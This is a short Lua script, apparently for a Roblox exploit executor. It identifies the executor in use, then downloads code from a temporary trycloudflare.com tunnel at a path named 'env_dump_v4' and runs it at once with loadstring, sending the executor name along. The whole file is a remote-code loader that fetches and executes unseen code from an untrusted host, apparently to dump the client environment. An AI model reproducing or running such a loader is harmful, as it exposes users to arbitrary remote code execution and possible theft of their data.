local executorName = "none"

pcall(function()
    if type(getexecutorname) == "function" then
        local name = getexecutorname()

        if type(name) == "string" and #name > 0 then
            executorName = name
            return
        end
    end

    if type(identifyexecutor) == "function" then
        local name = identifyexecutor()

        if type(name) == "string" and #name > 0 then
            executorName = name
            return
        end
    end
end)

loadstring(game:HttpGet("https://views-unlikely-parents-incurred.trycloudflare.com/env_dump_v4" .. "?executor=" .. executorName))()
